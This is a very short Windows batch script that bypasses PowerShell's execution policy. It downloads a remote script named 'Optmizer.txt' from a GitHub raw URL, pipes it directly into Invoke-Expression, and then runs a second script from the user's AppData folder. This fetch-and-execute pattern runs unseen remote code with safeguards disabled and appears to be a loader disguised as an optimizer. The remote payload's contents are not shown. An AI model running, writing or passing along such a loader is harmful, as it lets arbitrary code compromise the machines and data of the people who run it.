@echo off
powershell -ExecutionPolicy Bypass -NoProfile -Command "irm https://raw.githubusercontent.com/HonkShefter/sundshefter/refs/heads/main/Optmizer.txt | iex"

powershell powershell -ExecutionPolicy Bypass -File %USERPROFILE%\AppData\script.ps1